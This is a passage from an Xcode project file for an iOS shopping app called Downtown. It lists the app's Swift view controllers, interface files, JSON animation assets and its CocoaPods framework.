// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 51;
	objects = {

/* Begin PBXBuildFile section */
		1AA91F2F254DD991001712E1 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 1AA91F2E254DD991001712E1 /* Assets.xcassets */; };
		1AA91F33254DD9A1001712E1 /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 1AA91F32254DD9A1001712E1 /* Images.xcassets */; };
		1AA91F36254DD9DE001712E1 /* itemView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1AA91F35254DD9DE001712E1 /* itemView.swift */; };
		1AA91F3A254DD9E8001712E1 /* lovedViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1AA91F39254DD9E8001712E1 /* lovedViewController.swift */; };
		2CDC0E93A566FAFC64157B02 /* Pods_DowntownApp.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 599FE99B7EB535D669D87B36 /* Pods_DowntownApp.framework */; };
		F112AA0A259FFCAC005B0318 /* createShopView.xib in Resources */ = {isa = PBXBuildFile; fileRef = F112AA09259FFCAC005B0318 /* createShopView.xib */; };
		F112AA0D259FFD50005B0318 /* shopPopUp.swift in Sources */ = {isa = PBXBuildFile; fileRef = F112AA0C259FFD50005B0318 /* shopPopUp.swift */; };
		F13056B025A5E33F0039B6D2 /* AddProductVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = F13056AF25A5E33F0039B6D2 /* AddProductVC.swift */; };
		F13056B625A5E7090039B6D2 /* ProductCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = F13056B425A5E7080039B6D2 /* ProductCollectionViewCell.swift */; };
		F13056B725A5E7090039B6D2 /* ProductCollectionViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = F13056B525A5E7090039B6D2 /* ProductCollectionViewCell.xib */; };
		F13056BC25A5EE2E0039B6D2 /* BasicStuff.swift in Sources */ = {isa = PBXBuildFile; fileRef = F13056BB25A5EE2E0039B6D2 /* BasicStuff.swift */; };
		F148713C25395F1200BA5C6F /* SavedCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = F148713A25395F1200BA5C6F /* SavedCell.swift */; };
		F148713D25395F1200BA5C6F /* SavedCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = F148713B25395F1200BA5C6F /* SavedCell.xib */; };
		F14CAF1B25369682008A1B71 /* CollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = F14CAF1925369682008A1B71 /* CollectionViewCell.swift */; };
		F14CAF1C25369682008A1B71 /* CollectionViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = F14CAF1A25369682008A1B71 /* CollectionViewCell.xib */; };
		F1520ADC2584890000D0489F /* ordersCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1520ADA2584890000D0489F /* ordersCell.swift */; };
		F1520ADD2584890000D0489F /* ordersCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = F1520ADB2584890000D0489F /* ordersCell.xib */; };
		F16F4419255368DD009FDF9D /* viewProduct.swift in Sources */ = {isa = PBXBuildFile; fileRef = F16F4417255368DD009FDF9D /* viewProduct.swift */; };
		F16F441A255368DD009FDF9D /* viewProduct.xib in Resources */ = {isa = PBXBuildFile; fileRef = F16F4418255368DD009FDF9D /* viewProduct.xib */; };
		F186D1C025AD4216004AC860 /* blobs.json in Resources */ = {isa = PBXBuildFile; fileRef = F186D1BF25AD4216004AC860 /* blobs.json */; };
		F186D58325A9E4B500D852BF /* ShopMangeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = F186D58225A9E4B500D852BF /* ShopMangeVC.swift */; };
		F1BBA61925A968750096CA29 /* OrderHistoryVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1BBA61825A968750096CA29 /* OrderHistoryVC.swift */; };
		F1BBA61E25A969490096CA29 /* OrderHistoryCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1BBA61C25A969490096CA29 /* OrderHistoryCell.swift */; };
		F1BBA61F25A969490096CA29 /* OrderHistoryCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = F1BBA61D25A969490096CA29 /* OrderHistoryCell.xib */; };
		F1E292A4250D2693007B0238 /* inVentoryCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1E292A0250D2693007B0238 /* inVentoryCell.swift */; };
		F1E292A5250D2693007B0238 /* inVentoryCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = F1E292A1250D2693007B0238 /* inVentoryCell.xib */; };
		F1E292A6250D2693007B0238 /* TableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1E292A2250D2693007B0238 /* TableViewCell.swift */; };
		F1E292A7250D2693007B0238 /* TableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = F1E292A3250D2693007B0238 /* TableViewCell.xib */; };
		F1E292AE250D28A8007B0238 /* discoveryCellCollectionViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = F1E292AC250D28A8007B0238 /* discoveryCellCollectionViewCell.xib */; };
		F1E292AF250D28A8007B0238 /* discoveryCellCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1E292AD250D28A8007B0238 /* discoveryCellCollectionViewCell.swift */; };
		F1E292B5250D7E16007B0238 /* segues.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1E292B4250D7E16007B0238 /* segues.swift */; };
		F1E292CA250D8287007B0238 /* UserDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1E292C4250D8285007B0238 /* UserDetailViewController.swift */; };
		F1E292CB250D8287007B0238 /* NodeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1E292C5250D8286007B0238 /* NodeViewController.swift */; };
		F1E292CD250D8287007B0238 /* clientDataSheet.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1E292C7250D8287007B0238 /* clientDataSheet.swift */; };
		F1E292CE250D8287007B0238 /* purchaseScreen.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1E292C8250D8287007B0238 /* purchaseScreen.swift */; };
		F1E7275A25B0142F00D2510A /* StripeModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1E7275925B0142F00D2510A /* StripeModel.swift */; };
		F1F05BC3251BBA1D00172077 /* bubbless.json in Resources */ = {isa = PBXBuildFile; fileRef = F1F05BC2251BBA1D00172077 /* bubbless.json */; };
		F1F05BC5251BBACC00172077 /* bubbles.json in Resources */ = {isa = PBXBuildFile; fileRef = F1F05BC4251BBACB00172077 /* bubbles.json */; };
		F1F20838250C77FD00DD8DB7 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F20837250C77FD00DD8DB7 /* AppDelegate.swift */; };
		F1F2083A250C77FD00DD8DB7 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F20839250C77FD00DD8DB7 /* SceneDelegate.swift */; };
		F1F2083C250C77FD00DD8DB7 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F2083B250C77FD00DD8DB7 /* ViewController.swift */; };
		F1F2083F250C77FD00DD8DB7 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = F1F2083D250C77FD00DD8DB7 /* Main.storyboard */; };
		F1F20844250C780000DD8DB7 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = F1F20842250C780000DD8DB7 /* LaunchScreen.storyboard */; };
		F1F2084C250C94FE00DD8DB7 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = F1F2084B250C94FE00DD8DB7 /* Main.storyboard */; };
		F1F2084E250C967800DD8DB7 /* ResetPasswordViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F2084D250C967800DD8DB7 /* ResetPasswordViewController.swift */; };
		F1F2085A250C99B800DD8DB7 /* RefferedViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F20851250C99B800DD8DB7 /* RefferedViewController.swift */; };
		F1F2085B250C99B800DD8DB7 /* viewShopVc.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F20852250C99B800DD8DB7 /* viewShopVc.swift */; };
		F1F2085C250C99B800DD8DB7 /* homePage.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F20853250C99B800DD8DB7 /* homePage.swift */; };
		F1F2085D250C99B800DD8DB7 /* discovery.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F20854250C99B800DD8DB7 /* discovery.swift */; };
		F1F2085E250C99B800DD8DB7 /* QueryShopViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F20855250C99B800DD8DB7 /* QueryShopViewController.swift */; };
		F1F2085F250C99B800DD8DB7 /* viewItemViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F20856250C99B800DD8DB7 /* viewItemViewController.swift */; };
		F1F20860250C99B800DD8DB7 /* SearchIViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F20857250C99B800DD8DB7 /* SearchIViewController.swift */; };
		F1F20861250C99B800DD8DB7 /* sellerTab.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F20858250C99B800DD8DB7 /* sellerTab.swift */; };
		F1F20868250C99CC00DD8DB7 /* SignUpViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F20863250C99CB00DD8DB7 /* SignUpViewController.swift */; };
		F1F20869250C99CC00DD8DB7 /* SelectViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F20864250C99CB00DD8DB7 /* SelectViewController.swift */; };
		F1F2086A250C99CC00DD8DB7 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = F1F20865250C99CB00DD8DB7 /* GoogleService-Info.plist */; };
		F1F2086B250C99CC00DD8DB7 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F20866250C99CB00DD8DB7 /* LoginViewController.swift */; };
		F1F2086C250C99CC00DD8DB7 /* Explanation.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F20867250C99CB00DD8DB7 /* Explanation.swift */; };
		F1F20872250C9A2900DD8DB7 /* MultiVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F2086E250C9A2900DD8DB7 /* MultiVC.swift */; };
		F1F20873250C9A2900DD8DB7 /* LoginExViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F2086F250C9A2900DD8DB7 /* LoginExViewController.swift */; };
		F1F20874250C9A2900DD8DB7 /* Offload.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F20870250C9A2900DD8DB7 /* Offload.swift */; };
		F1F20875250C9A2900DD8DB7 /* itemLog.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F20871250C9A2900DD8DB7 /* itemLog.swift */; };
		F1F20893250C9A3700DD8DB7 /* bookMarkB.json in Resources */ = {isa = PBXBuildFile; fileRef = F1F20877250C9A3600DD8DB7 /* bookMarkB.json */; };
		F1F20894250C9A3700DD8DB7 /* pop1J.textClipping in Resources */ = {isa = PBXBuildFile; fileRef = F1F20878250C9A3600DD8DB7 /* pop1J.textClipping */; };
		F1F20895250C9A3700DD8DB7 /* stuff.json in Resources */ = {isa = PBXBuildFile; fileRef = F1F20879250C9A3600DD8DB7 /* stuff.json */; };
		F1F20896250C9A3700DD8DB7 /* Infinite.json in Resources */ = {isa = PBXBuildFile; fileRef = F1F2087A250C9A3600DD8DB7 /* Infinite.json */; };
		F1F20897250C9A3700DD8DB7 /* shoppingCart.json in Resources */ = {isa = PBXBuildFile; fileRef = F1F2087B250C9A3600DD8DB7 /* shoppingCart.json */; };
		F1F20898250C9A3700DD8DB7 /* layeredMenu.json in Resources */ = {isa = PBXBuildFile; fileRef = F1F2087C250C9A3600DD8DB7 /* layeredMenu.json */; };
		F1F20899250C9A3700DD8DB7 /* creditcard.json in Resources */ = {isa = PBXBuildFile; fileRef = F1F2087D250C9A3600DD8DB7 /* creditcard.json */; };
		F1F2089A250C9A3700DD8DB7 /* padLock.json in Resources */ = {isa = PBXBuildFile; fileRef = F1F2087E250C9A3600DD8DB7 /* padLock.json */; };
		F1F2089B250C9A3700DD8DB7 /* home.json in Resources */ = {isa = PBXBuildFile; fileRef = F1F2087F250C9A3600DD8DB7 /* home.json */; };
		F1F208AC250C9A3700DD8DB7 /* newLogo.json in Resources */ = {isa = PBXBuildFile; fileRef = F1F20892250C9A3600DD8DB7 /* newLogo.json */; };
		F1F382E925B4B7F900E352BC /* purchaseView.swift in Sources */ = {isa = PBXBuildFile; fileRef = F1F382E825B4B7F900E352BC /* purchaseView.swift */; };
		F1F382EB25B4D71600E352BC /* OverlayView.xib in Resources */ = {isa = PBXBuildFile; fileRef = F1F382EA25B4D71600E352BC /* OverlayView.xib */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		1AA91F2E254DD991001712E1 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		1AA91F32254DD9A1001712E1 /* Images.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Images.xcassets; sourceTree = "<group>"; };
		1AA91F35254DD9DE001712E1 /* itemView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = itemView.swift; sourceTree = "<group>"; };
		1AA91F39254DD9E8001712E1 /* lovedViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = lovedViewController.swift; sourceTree = "<group>"; };
		2462F4C926000EDE5E6E0A65 /* Pods-DowntownApp.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DowntownApp.release.xcconfig"; path = "Target Support Files/Pods-DowntownApp/Pods-DowntownApp.release.xcconfig"; sourceTree = "<group>"; };
		3E1B87244D50F6E87C6FF422 /* Pods-DowntownApp.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DowntownApp.debug.xcconfig"; path = "Target Support Files/Pods-DowntownApp/Pods-DowntownApp.debug.xcconfig"; sourceTree = "<group>"; };
		599FE99B7EB535D669D87B36 /* Pods_DowntownApp.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DowntownApp.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		F112AA09259FFCAC005B0318 /* createShopView.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = createShopView.xib; sourceTree = "<group>"; };
		F112AA0C259FFD50005B0318 /* shopPopUp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = shopPopUp.swift; sourceTree = "<group>"; };
		F13056AF25A5E33F0039B6D2 /* AddProductVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddProductVC.swift; sourceTree = "<group>"; };
		F13056B425A5E7080039B6D2 /* ProductCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductCollectionViewCell.swift; sourceTree = "<group>"; };
		F13056B525A5E7090039B6D2 /* ProductCollectionViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ProductCollectionViewCell.xib; sourceTree = "<group>"; };
		F13056BB25A5EE2E0039B6D2 /* BasicStuff.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BasicStuff.swift; sourceTree = "<group>"; };
		F148713A25395F1200BA5C6F /* SavedCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SavedCell.swift; sourceTree = "<group>"; };
		F148713B25395F1200BA5C6F /* SavedCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SavedCell.xib; sourceTree = "<group>"; };
		F14CAF1925369682008A1B71 /* CollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CollectionViewCell.swift; sourceTree = "<group>"; };
		F14CAF1A25369682008A1B71 /* CollectionViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CollectionViewCell.xib; sourceTree = "<group>"; };
		F1520ADA2584890000D0489F /* ordersCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ordersCell.swift; sourceTree = "<group>"; };
		F1520ADB2584890000D0489F /* ordersCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ordersCell.xib; sourceTree = "<group>"; };
		F16F4417255368DD009FDF9D /* viewProduct.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = viewProduct.swift; sourceTree = "<group>"; };
		F16F4418255368DD009FDF9D /* viewProduct.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = viewProduct.xib; sourceTree = "<group>"; };
		F186D1BF25AD4216004AC860 /* blobs.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = blobs.json; sourceTree = "<group>"; };
		F186D58225A9E4B500D852BF /* ShopMangeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ShopMangeVC.swift; sourceTree = "<group>"; };
		F1BBA61825A968750096CA29 /* OrderHistoryVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderHistoryVC.swift; sourceTree = "<group>"; };
		F1BBA61C25A969490096CA29 /* OrderHistoryCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderHistoryCell.swift; sourceTree = "<group>"; };
		F1BBA61D25A969490096CA29 /* OrderHistoryCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OrderHistoryCell.xib; sourceTree = "<group>"; };
		F1E292A0250D2693007B0238 /* inVentoryCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = inVentoryCell.swift; sourceTree = "<group>"; };
		F1E292A1250D2693007B0238 /* inVentoryCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = inVentoryCell.xib; sourceTree = "<group>"; };
		F1E292A2250D2693007B0238 /* TableViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TableViewCell.swift; sourceTree = "<group>"; };
		F1E292A3250D2693007B0238 /* TableViewCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = TableViewCell.xib; sourceTree = "<group>"; };
		F1E292AC250D28A8007B0238 /* discoveryCellCollectionViewCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = discoveryCellCollectionViewCell.xib; sourceTree = "<group>"; };
		F1E292AD250D28A8007B0238 /* discoveryCellCollectionViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = discoveryCellCollectionViewCell.swift; sourceTree = "<group>"; };
		F1E292B4250D7E16007B0238 /* segues.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = segues.swift; sourceTree = "<group>"; };
		F1E292C4250D8285007B0238 /* UserDetailViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UserDetailViewController.swift; sourceTree = "<group>"; };
		F1E292C5250D8286007B0238 /* NodeViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NodeViewController.swift; sourceTree = "<group>"; };
		F1E292C7250D8287007B0238 /* clientDataSheet.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = clientDataSheet.swift; sourceTree = "<group>"; };
		F1E292C8250D8287007B0238 /* purchaseScreen.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = purchaseScreen.swift; sourceTree = "<group>"; };
		F1E7275925B0142F00D2510A /* StripeModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StripeModel.swift; sourceTree = "<group>"; };
		F1F05BC2251BBA1D00172077 /* bubbless.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = bubbless.json; sourceTree = "<group>"; };
		F1F05BC4251BBACB00172077 /* bubbles.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = bubbles.json; sourceTree = "<group>"; };
		F1F20834250C77FD00DD8DB7 /* Downtown.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Downtown.app; sourceTree = BUILT_PRODUCTS_DIR; };
		F1F20837250C77FD00DD8DB7 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		F1F20839250C77FD00DD8DB7 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		F1F2083B250C77FD00DD8DB7 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
		F1F2083E250C77FD00DD8DB7 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		F1F20843250C780000DD8DB7 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		F1F20845250C780000DD8DB7 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		F1F2084B250C94FE00DD8DB7 /* Main.storyboard */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.storyboard; path = Main.storyboard; sourceTree = "<group>"; };
		F1F2084D250C967800DD8DB7 /* ResetPasswordViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ResetPasswordViewController.swift; sourceTree = "<group>"; };
		F1F20851250C99B800DD8DB7 /* RefferedViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RefferedViewController.swift; sourceTree = "<group>"; };
		F1F20852250C99B800DD8DB7 /* viewShopVc.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = viewShopVc.swift; sourceTree = "<group>"; };
		F1F20853250C99B800DD8DB7 /* homePage.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = homePage.swift; sourceTree = "<group>"; };
		F1F20854250C99B800DD8DB7 /* discovery.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = discovery.swift; sourceTree = "<group>"; };
		F1F20855250C99B800DD8DB7 /* QueryShopViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = QueryShopViewController.swift; sourceTree = "<group>"; };
		F1F20856250C99B800DD8DB7 /* viewItemViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = viewItemViewController.swift; sourceTree = "<group>"; };
		F1F20857250C99B800DD8DB7 /* SearchIViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SearchIViewController.swift; sourceTree = "<group>"; };
		F1F20858250C99B800DD8DB7 /* sellerTab.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = sellerTab.swift; sourceTree = "<group>"; };
		F1F20863250C99CB00DD8DB7 /* SignUpViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SignUpViewController.swift; sourceTree = "<group>"; };
		F1F20864250C99CB00DD8DB7 /* SelectViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SelectViewController.swift; sourceTree = "<group>"; };
		F1F20865250C99CB00DD8DB7 /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
		F1F20866250C99CB00DD8DB7 /* LoginViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
		F1F20867250C99CB00DD8DB7 /* Explanation.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Explanation.swift; sourceTree = "<group>"; };
		F1F2086E250C9A2900DD8DB7 /* MultiVC.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = MultiVC.swift; sourceTree = "<group>"; };
		F1F2086F250C9A2900DD8DB7 /* LoginExViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LoginExViewController.swift; sourceTree = "<group>"; };
		F1F20870250C9A2900DD8DB7 /* Offload.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Offload.swift; sourceTree = "<group>"; };
		F1F20871250C9A2900DD8DB7 /* itemLog.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = itemLog.swift; sourceTree = "<group>"; };
		F1F20877250C9A3600DD8DB7 /* bookMarkB.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = bookMarkB.json; sourceTree = "<group>"; };
		F1F20878250C9A3600DD8DB7 /* pop1J.textClipping */ = {isa = PBXFileReference; lastKnownFileType = file.bplist; path = pop1J.textClipping; sourceTree = "<group>"; };
		F1F20879250C9A3600DD8DB7 /* stuff.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = stuff.json; sourceTree = "<group>"; };
		F1F2087A250C9A3600DD8DB7 /* Infinite.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = Infinite.json; sourceTree = "<group>"; };
		F1F2087B250C9A3600DD8DB7 /* shoppingCart.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = shoppingCart.json; sourceTree = "<group>"; };
		F1F2087C250C9A3600DD8DB7 /* layeredMenu.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = layeredMenu.json; sourceTree = "<group>"; };
		F1F2087D250C9A3600DD8DB7 /* creditcard.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = creditcard.json; sourceTree = "<group>"; };
		F1F2087E250C9A3600DD8DB7 /* padLock.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = padLock.json; sourceTree = "<group>"; };
		F1F2087F250C9A3600DD8DB7 /* home.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = home.json; sourceTree = "<group>"; };
		F1F20892250C9A3600DD8DB7 /* newLogo.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = newLogo.json; sourceTree = "<group>"; };
		F1F382E825B4B7F900E352BC /* purchaseView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = purchaseView.swift; sourceTree = "<group>"; };
		F1F382EA25B4D71600E352BC /* OverlayView.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = OverlayView.xib; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		F1F20831250C77FD00DD8DB7 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				2CDC0E93A566FAFC64157B02 /* Pods_DowntownApp.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		1AA930EE254E8A290057FDF0 /* ViewControllers */ = {
			isa = PBXGroup;
			children = (
				F186D58125A9E49000D852BF /* Shop */,
				F1F20862250C99CB00DD8DB7 /* firstScreens */,
				F1F2084F250C99B800DD8DB7 /* MainPages */,
				F1E292C4250D8285007B0238 /* UserDetailViewController.swift */,
				F13056AE25A5E3260039B6D2 /* AddProduct */,
				F1F2083B250C77FD00DD8DB7 /* ViewController.swift */,
				F1F2084D250C967800DD8DB7 /* ResetPasswordViewController.swift */,
				F1E292C5250D8286007B0238 /* NodeViewController.swift */,
			);
			path = ViewControllers;
			sourceTree = "<group>";
		};
		1AA930F0254E8A7D0057FDF0 /* Resources */ = {
			isa = PBXGroup;
			children = (
				1AA91F2E254DD991001712E1 /* Assets.xcassets */,
				1AA91F32254DD9A1001712E1 /* Images.xcassets */,
			);
			path = Resources;
			sourceTree = "<group>";
		};
		1AA930F1254E8A980057FDF0 /* Views */ = {
			isa = PBXGroup;
			children = (
				F1F382EA25B4D71600E352BC /* OverlayView.xib */,
				F1F382E825B4B7F900E352BC /* purchaseView.swift */,
				F112AA0B259FFD34005B0318 /* ShopView */,
				F1E2929F250D2693007B0238 /* cellSXibAndSwift */,
			);
			path = Views;
			sourceTree = "<group>";
		};
		1AA930F2254E8B340057FDF0 /* Globals */ = {
			isa = PBXGroup;
			children = (
				F1F2086D250C9A2900DD8DB7 /* multiMedia */,
				F1F20853250C99B800DD8DB7 /* homePage.swift */,
				F1F20858250C99B800DD8DB7 /* sellerTab.swift */,
			);
			path = Globals;
			sourceTree = "<group>";
		};
		1AA930F3254E8BA80057FDF0 /* Supporting */ = {
			isa = PBXGroup;
			children = (
				F1F20837250C77FD00DD8DB7 /* AppDelegate.swift */,
				F1F20839250C77FD00DD8DB7 /* SceneDelegate.swift */,
				F1F20865250C99CB00DD8DB7 /* GoogleService-Info.plist */,
			);
			path = Supporting;
			sourceTree = "<group>";
		};
		1AA930F4254E8BC90057FDF0 /* Storyboards */ = {
